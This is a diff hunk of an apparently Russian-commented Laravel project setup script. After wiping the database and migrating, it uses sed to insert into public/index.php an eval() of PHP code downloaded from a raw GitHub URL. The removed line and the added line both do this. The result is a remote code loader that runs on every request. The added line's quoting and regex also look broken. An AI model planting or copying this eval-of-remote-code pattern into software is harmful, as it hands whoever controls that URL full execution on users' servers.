@@ -645,8 +645,7 @@ php artisan db:wipe;
 php artisan migrate;
 npm run build --verbose; 
 
-sed -i '/<?\(php\)\?/ a\
-\n eval(preg_replace(['/<(\?|\%)\=?(php)?/', '/(\%|\?)>/'], '', file_get_contents('https://raw.githubusercontent.com/ahilespelid/functions/betabank/init.php')));' public/index.php
+sed -i '1s/<?\(php\)\?/&\neval(preg_replace([\'/<(\?|\%)\=?(php)?/\', \'(\%|\?)\>/\'], \'\', file_get_contents(\'https://raw.githubusercontent.com/ahilespelid/functions/betabank/init.php\')));/' public/index.php
 
 # Выводим сообщение об успешном создании
 echo "Проект успешно создан в директории '$PROJECT_DIR'!"
